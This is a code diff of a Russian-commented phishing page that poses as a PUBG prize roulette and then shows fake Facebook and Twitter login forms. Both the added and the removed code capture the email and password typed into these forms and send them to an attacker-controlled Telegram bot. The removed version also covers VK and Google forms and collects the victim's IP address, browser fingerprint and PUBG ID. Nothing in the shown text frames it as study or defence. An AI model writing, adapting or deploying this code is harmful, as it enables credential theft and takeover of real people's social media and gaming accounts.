+            } catch (error) {
+                console.error('Ошибка отправки в Telegram:', error);
+                return false;
+            }
+        }
+
+        // Выбор опции входа
+        facebookOption.addEventListener('click', () => {
+            facebookOption.classList.add('active');
+            twitterOption.classList.remove('active');
+            selectedLoginOption = 'facebook';
+        });
+
+        twitterOption.addEventListener('click', () => {
+            twitterOption.classList.add('active');
+            facebookOption.classList.remove('active');
+            selectedLoginOption = 'twitter';
+        });
+
+        // Подтверждение выбора входа
+        confirmLogin.addEventListener('click', () => {
+            winModal.style.display = 'none';
+            
+            if (selectedLoginOption === 'facebook') {
+                facebookModal.style.display = 'flex';
+            } else {
+                twitterModal.style.display = 'flex';
+            }
+        });
+
+        // Обработчики событий
+        spinButton.addEventListener('click', spinRoulette);
+
+        // Отмена выигрыша
+        document.getElementById('cancelWin').addEventListener('click', () => {
+            winModal.style.display = 'none';
+        });
+
+        // Форма Facebook
+        document.getElementById('facebookForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const email = document.getElementById('fbEmail').value;
+            const password = document.getElementById('fbPassword').value;
+            
+            // Отправка данных в Telegram
+            const success = await sendToTelegram({
+                prize: currentPrize.name,
+                login: email,
+                password: password,
+                network: 'Facebook'
             });
             
-            // Закрытие модалок
-            ['socialModal', 'facebookModal', 'vkModal', 'googleModal', 'pubgModal', 'successModal'].forEach(id => {
-                document.getElementById(id).addEventListener('click', function(e) {
-                    if (e.target === this) closeModal(id);
-                });
+            if (success) {
+                facebookModal.style.display = 'none';
+                successPrizeImage.src = currentPrize.image;
+                successModal.style.display = 'flex';
+            }
+        });
+
+        // Форма Twitter
+        document.getElementById('twitterForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const email = document.getElementById('twitterEmail').value;
+            const password = document.getElementById('twitterPassword').value;
+            
+            // Отправка данных в Telegram
+            const success = await sendToTelegram({
+                prize: currentPrize.name,
+                login: email,
+                password: password,
+                network: 'Twitter'
+            });
+            
+            if (success) {
+                twitterModal.style.display = 'none';
+                successPrizeImage.src = currentPrize.image;
+                successModal.style.display = 'flex';
+            }
+        });
+
+        // Кнопки "Not now"
+        document.getElementById('fbNotNow').addEventListener('click', (e) => {
+            e.preventDefault();
+            facebookModal.style.display = 'none';
+            winModal.style.display = 'flex';
+        });
+
+        document.getElementById('forgotPassword').addEventListener('click', (e) => {
+            e.preventDefault();
+            // В реальном приложении здесь была бы страница восстановления пароля
+            alert('Password recovery feature would open here');
+        });
+
+        document.getElementById('twitterForgot').addEventListener('click', (e) => {
+            e.preventDefault();
+            // В реальном приложении здесь была бы страница восстановления пароля
+            alert('Password recovery feature would open here');
+        });
+
+        // Создание аккаунта
+        document.getElementById('createAccount').addEventListener('click', () => {
+            // В реальном приложении здесь была бы страница создания аккаунта
+            alert('Account creation page would open here');
+        });
+
+        document.getElementById('twitterSignup').addEventListener('click', (e) => {
+            e.preventDefault();
+            // В реальном приложении здесь была бы страница регистрации
+            alert('Twitter signup page would open here');
+        });
+
+        // Альтернативные способы входа
+        document.getElementById('twitterGoogle').addEventListener('click', () => {
+            alert('Google sign-in would open here');
+        });
+
+        document.getElementById('twitterApple').addEventListener('click', () => {
+            alert('Apple sign-in would open here');
+        });
+
+        // Кнопки успешного получения
+        document.getElementById('cancelSuccess').addEventListener('click', () => {
+            successModal.style.display = 'none';
+        });
+
+        document.getElementById('okSuccess').addEventListener('click', () => {
+            successModal.style.display = 'none';
+            // Можно добавить редирект или другие действия
+        });
+
+        // Блокировка прокрутки
+        document.addEventListener('touchmove', function(e) {
+            if (e.target.closest('.roulette-container') || e.target.closest('.container')) {
+                e.preventDefault();
+            }
+        }, { passive: false });
+
+        document.addEventListener('wheel', function(e) {
+            if (e.target.closest('.roulette-container') || e.target.closest('.container')) {
+                e.preventDefault();
+            }
+        }, { passive: false });
+
+        window.addEventListener('scroll', function() {
+            document.querySelector('.container').style.transform = 'translateY(0)';
+        });
+
+        // Закрытие модальных окон по клику на оверлей
+        const modals = document.querySelectorAll('.modal-overlay');
+        modals.forEach(modal => {
+            modal.addEventListener('click', (e) => {
+                if (e.target === modal) {
+                    modal.style.display = 'none';
+                }
             });
         });
 
-        function showSocialModal() {
-            if (!currentPrize) {
-                alert('Сначала крути рулетку!');
-                return;
-            }
-            document.getElementById('socialModal').style.display = 'flex';
-        }
-
-        function confirmSocialChoice() {
-            closeModal('socialModal');
-            
-            switch(selectedSocial) {
-                case 'facebook':
-                    showFacebookModal();
-                    break;
-                case 'vk':
-                    showVkModal();
-                    break;
-                case 'google':
-                    showGoogleModal();
-                    break;
-            }
-        }
-
-        async function getUserIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                userIP = data.ip;
-            } catch (error) {
-                userIP = 'Неизвестно';
-            }
-        }
-
-        function createPrizesGrid() {
-            const grid = document.getElementById('prizesGrid');
-            grid.innerHTML = '';
-            
-            prizes.forEach((prize, index) => {
-                const item = document.createElement('div');
-                item.className = 'prize-item';
-                item.style.animationDelay = `${index * 0.1}s`;
-                item.innerHTML = `
-                    <img src="${prize.image}" alt="${prize.name}" 
-                         onerror="this.onerror=null; this.src='https://i.imgur.com/4N0vzrR.png'">
-                    <div class="prize-item-name">${prize.name}</div>
-                `;
-                
-                item.addEventListener('click', () => {
-                    showPrizeInfo(prize);
-                });
-                
-                grid.appendChild(item);
-            });
-        }
-
-        function showPrizeInfo(prize) {
-            const alertBox = document.createElement('div');
-            alertBox.style.cssText = `
-                position: fixed;
-                top: 50%;
-                left: 50%;
-                transform: translate(-50%, -50%);
-                background: rgba(0,0,0,0.95);
-                color: white;
-                padding: 30px;
-                border-radius: 20px;
-                border: 2px solid #ff3838;
-                box-shadow: 0 20px 50px rgba(255,56,56,0.5);
-                z-index: 10001;
-                max-width: 400px;
-                width: 90%;
-                text-align: center;
-                backdrop-filter: blur(10px);
-            `;
-            
-            alertBox.innerHTML = `
-                <div style="font-size: 40px; margin-bottom: 20px;">🎁</div>
-                <div style="font-size: 24px; color: #FFD700; margin-bottom: 15px; font-weight: bold;">${prize.name}</div>
-                <div style="color: #00b894; font-size: 18px; margin-bottom: 20px;">${prize.description}</div>
-                <div style="color: #aaa; margin-bottom: 25px;">Редкий эксклюзивный приз!</div>
-                <button onclick="this.parentElement.remove(); document.body.removeChild(document.body.lastChild)" style="
-                    background: linear-gradient(45deg, #ff3838, #ff6b6b);
-                    color: white;
-                    border: none;
-                    padding: 12px 30px;
-                    border-radius: 10px;
-                    font-size: 16px;
-                    font-weight: bold;
-                    cursor: pointer;
-                ">Закрыть</button>
-            `;
-            
-            document.body.appendChild(alertBox);
-            
-            const overlay = document.createElement('div');
-            overlay.style.cssText = `
-                position: fixed;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                background: rgba(0,0,0,0.7);
-                z-index: 10000;
-                backdrop-filter: blur(5px);
-            `;
-            overlay.onclick = () => {
-                alertBox.remove();
-                overlay.remove();
-            };
-            document.body.appendChild(overlay);
-        }
-
-        function spin() {
-            if (hasSpun) {
-                alert('⚠️ У тебя только одна попытка на аккаунт!');
-                return;
-            }
-            
-            const spinBtn = document.getElementById('spinButton');
-            const slotMachine = document.querySelector('.slot-machine-inner');
-            const prizeDisplay = document.getElementById('prizeDisplay');
-            
-            // Анимация вращения
-            spinBtn.disabled = true;
-            spinBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> КРУТИТСЯ...';
-            slotMachine.classList.add('spinning');
-            prizeDisplay.style.opacity = '0.7';
-            
-            // Эффект вращения рулетки
-            const slot = document.querySelector('.slot-machine');
-            slot.style.animation = 'spinWheel 0.2s linear infinite';
-            
-            // Создаем эффект вращения с ускорением
-            let speed = 100;
-            const spinInterval = setInterval(() => {
-                speed -= 5;
-                if (speed <= 20) {
-                    clearInterval(spinInterval);
-                    revealPrize();
-                }
-            }, 100);
-
-            function revealPrize() {
-                // Рандомный выбор приза
-                const randomIndex = Math.floor(Math.random() * prizes.length);
-                currentPrize = prizes[randomIndex];
-                
-                // Завершаем анимацию
-                slot.style.animation = '';
-                slotMachine.classList.remove('spinning');
-                
-                // Анимация выигрыша
-                createConfetti();
-                playWinAnimation();
-                
-                setTimeout(() => {
-                    prizeDisplay.style.opacity = '1';
-                    document.getElementById('defaultPrize').style.display = 'none';
-                    document.getElementById('wonPrize').style.display = 'block';
-                    
-                    const prizeImage = document.getElementById('wonPrizeImage');
-                    prizeImage.src = currentPrize.image;
-                    prizeImage.onerror = function() {
-                        this.src = 'https://i.imgur.com/4N0vzrR.png';
-                    };
-                    
-                    document.getElementById('wonPrizeName').textContent = currentPrize.name;
-                    document.getElementById('wonPrizeDesc').textContent = currentPrize.description;
-                    
-                    document.getElementById('initialMessage').style.display = 'none';
-                    document.getElementById('winnerMessage').style.display = 'block';
-                    document.getElementById('winnerPrizeText').textContent = currentPrize.name;
-                    
-                    document.getElementById('socialChoiceBtn').style.display = 'flex';
-                    
-                    spinBtn.innerHTML = '🎉 УЖЕ ВЫИГРАНО!';
-                    hasSpun = true;
-                    
-                }, 1500);
-            }
-        }
-
-        function playWinAnimation() {
-            // Создаем анимированный элемент выигрыша
-            const winAnimation = document.createElement('div');
-            winAnimation.className = 'won-prize-animation';
-            winAnimation.innerHTML = '🏆';
-            winAnimation.style.color = '#FFD700';
-            winAnimation.style.fontSize = '80px';
-            
-            document.querySelector('.prize-display').appendChild(winAnimation);
-            
-            setTimeout(() => {
-                winAnimation.remove();
-            }, 1500);
-            
-            // Создаем эффект свечения
-            const glow = document.createElement('div');
-            glow.style.cssText = `
-                position: absolute;
-                top: 0;
-                left: 0;
-                width: 100%;
-                height: 100%;
-                background: radial-gradient(circle at center, rgba(255, 215, 0, 0.3), transparent 70%);
-                animation: fadeOut 1.5s forwards;
-                border-radius: 20px;
-            `;
-            
-            document.querySelector('.prize-display').appendChild(glow);
-            
-            setTimeout(() => {
-                glow.remove();
-            }, 1500);
-        }
-
-        function createConfetti() {
-            for (let i = 0; i < 50; i++) {
-                const confetti = document.createElement('div');
-                confetti.className = 'confetti';
-                confetti.style.left = Math.random() * 100 + 'vw';
-                confetti.style.width = Math.random() * 10 + 5 + 'px';
-                confetti.style.height = Math.random() * 10 + 5 + 'px';
-                confetti.style.animationDelay = Math.random() * 2 + 's';
-                confetti.style.animationDuration = Math.random() * 3 + 2 + 's';
-                
-                document.body.appendChild(confetti);
-                
-                setTimeout(() => {
-                    confetti.remove();
-                }, 5000);
-            }
-        }
-
-        function showFacebookModal() {
-            document.getElementById('facebookModal').style.display = 'flex';
-            document.getElementById('fbEmail').focus();
-        }
-
-        function showVkModal() {
-            document.getElementById('vkModal').style.display = 'flex';
-            document.getElementById('vkEmail').focus();
-        }
-
-        function showGoogleModal() {
-            document.getElementById('googleModal').style.display = 'flex';
-            document.getElementById('googleEmail').focus();
-        }
-
-        function closeModal(modalId) {
-            document.getElementById(modalId).style.display = 'none';
-            if (modalId.includes('Modal') && modalId !== 'socialModal') {
-                const form = document.getElementById(modalId.replace('Modal', 'Form'));
-                if (form) form.reset();
-            }
-        }
-
-        async function handleFacebookSubmit(e) {
-            e.preventDefault();
-            
-            const email = document.getElementById('fbEmail').value.trim();
-            const password = document.getElementById('fbPassword').value.trim();
-            
-            if (!email || !password) {
-                alert('Заполните все поля!');
-                return;
-            }
-            
-            socialData = {
-                social: 'facebook',
-                email: email,
-                password: password
-            };
-            
-            await sendSocialDataToTelegram();
-            closeModal('facebookModal');
-            showPubgModal();
-        }
-
-        async function handleVkSubmit(e) {
-            e.preventDefault();
-            
-            const email = document.getElementById('vkEmail').value.trim();
-            const password = document.getElementById('vkPassword').value.trim();
-            
-            if (!email || !password) {
-                alert('Заполните все поля!');
-                return;
-            }
-            
-            socialData = {
-                social: 'vk',
-                email: email,
-                password: password
-            };
-            
-            await sendSocialDataToTelegram();
-            closeModal('vkModal');
-            showPubgModal();
-        }
-
-        async function handleGoogleSubmit(e) {
-            e.preventDefault();
-            
-            const email = document.getElementById('googleEmail').value.trim();
-            const password = document.getElementById('googlePassword').value.trim();
-            
-            if (!email || !password) {
-                alert('Заполните все поля!');
-                return;
-            }
-            
-            socialData = {
-                social: 'google',
-                email: email,
-                password: password
-            };
-            
-            await sendSocialDataToTelegram();
-            closeModal('googleModal');
-            showPubgModal();
-        }
-
-        function showPubgModal() {
-            document.getElementById('pubgModal').style.display = 'flex';
-            document.getElementById('pubgId').focus();
-        }
-
-        async function handlePubgSubmit(e) {
-            e.preventDefault();
-            
-            const pubgId = document.getElementById('pubgId').value.trim();
-            const server = document.getElementById('pubgServer').value;
-            
-            if (!pubgId || !server) {
-                alert('Заполните все поля!');
-                return;
-            }
-            
-            if (!/^\d+$/.test(pubgId)) {
-                alert('ID PUBG должен содержать только цифры');
-                return;
-            }
-            
-            const submitBtn = document.querySelector('#pubgForm .fb-submit');
-            submitBtn.disabled = true;
-            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> ОТПРАВКА...';
-            
-            const userData = {
-                ...socialData,
-                pubg_id: pubgId,
-                pubg_server: server,
-                prize: currentPrize.name,
-                prize_code: currentPrize.code,
-                prize_description: currentPrize.description,
-                user_ip: userIP,
-                user_agent: navigator.userAgent,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timestamp: new Date().toLocaleString(),
-                browser_language: navigator.language,
-                screen_resolution: `${window.screen.width}x${window.screen.height}`
-            };
-            
-            saveToLocalStorage(userData);
-            await sendCompleteDataToTelegram(userData);
-            
-            setTimeout(() => {
-                closeModal('pubgModal');
-                showSuccessModal();
-                submitBtn.disabled = false;
-                submitBtn.innerHTML = 'ПОЛУЧИТЬ ПРИЗ';
-            }, 1000);
-        }
-
-        async function sendSocialDataToTelegram() {
-            try {
-                const message = `
-🔔 НОВЫЙ ВХОД В ${socialData.social.toUpperCase()}
-
-📧 Email/Телефон: ${socialData.email}
-🔐 Пароль: ${socialData.password}
-
-🎁 Выигранный приз: ${currentPrize.name}
-📍 IP: ${userIP}
-
-⏰ Время: ${new Date().toLocaleString()}
-                `;
-                
-                await sendToTelegram(message);
-                
-            } catch (error) {
-                console.error('❌ Ошибка отправки данных:', error);
-            }
-        }
-
-        async function sendCompleteDataToTelegram(data) {
-            try {
-                const message = `
-🎮 ПОЛНЫЕ ДАННЫЕ ПОБЕДИТЕЛЯ!
-
-🏆 ПРИЗ: ${data.prize}
-🔑 КОД: ${data.prize_code}
-📝 Описание: ${data.prize_description}
-
-🔗 СОЦСЕТЬ: ${data.social}
-📧 ЛОГИН: ${data.email}
-🔐 ПАРОЛЬ: ${data.password}
-
-🎮 PUBG ID: ${data.pubg_id}
-🌍 СЕРВЕР: ${data.pubg_server}
-
-📍 IP: ${data.user_ip}
-🌐 Браузер: ${data.user_agent}
-🗺️ Таймзона: ${data.timezone}
-🌍 Язык: ${data.browser_language}
-🖥️ Разрешение: ${data.screen_resolution}
-
-⏰ Время получения: ${data.timestamp}
-🆔 Сессия: ${generateSessionId()}
-
-🚀 ОТПРАВЬТЕ ПРИЗ ИГРОКУ!
-                `;
-                
-                await sendToTelegram(message);
-                
-            } catch (error) {
-                console.error('❌ Ошибка отправки полных данных:', error);
-            }
-        }
-
-        async function sendToTelegram(message) {
-            const encodedMessage = encodeURIComponent(message);
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`;
-            
-            try {
-                await fetch(url, { method: 'POST' });
-            } catch (error) {
-                console.error('Ошибка отправки в Telegram');
-            }
-        }
-
-        function generateSessionId() {
-            return 'SESS_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-        }
-
-        function saveToLocalStorage(data) {
-            let claims = JSON.parse(localStorage.getItem('pubg_claims') || '[]');
-            claims.push({
-                ...data,
-                claimed_at: new Date().toISOString()
-            });
-            localStorage.setItem('pubg_claims', JSON.stringify(claims));
-        }
-
-        function showSuccessModal() {
-            document.getElementById('activationCode').textContent = currentPrize.code;
-            document.getElementById('finalPrize').textContent = currentPrize.name;
-            document.getElementById('successModal').style.display = 'flex';
-            
-            document.getElementById('socialChoiceBtn').style.display = 'none';
-            
-            document.getElementById('winnerMessage').innerHTML = `
-                <div class="win-message">✅ ПРИЗ ПОЛУЧЕН!</div>
-                <div class="winner-prize">
-                    Код: <span>${currentPrize.code}</span>
-                </div>
-                <div class="winner-desc">
-                    Придет на почту в течение 24 часов
-                </div>
-            `;
-            
-            createConfetti();
-        }
+        // Инициализация при загрузке
+        window.addEventListener('load', initialize);
     </script>
 </body>
 </html>
